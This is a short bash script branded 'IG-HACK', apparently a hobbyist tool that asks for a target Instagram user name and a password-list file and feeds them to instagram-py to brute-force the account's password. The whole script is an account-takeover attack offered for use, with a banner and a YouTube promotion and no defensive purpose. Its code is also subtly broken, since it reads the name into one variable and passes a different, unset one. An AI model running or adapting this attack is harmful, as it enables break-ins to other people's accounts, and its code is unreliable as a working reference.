#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
    ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██║██║  ███╗█████╗███████║███████║██║V1.0 █████╔╝
    ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
    ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;87m  >>  Script By N17R0 << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;87m >>  Youtube Channel : \e[1;96m youtube.com/InfinityTrickster \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " mani
echo
read -p "[mani] Enter Passlist Location : " inspass
echo
if [ $inspass = 1 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 30.0
cd $HOME
fi
sleep 30.0
cd $HOME/ighack
bash ighack.sh
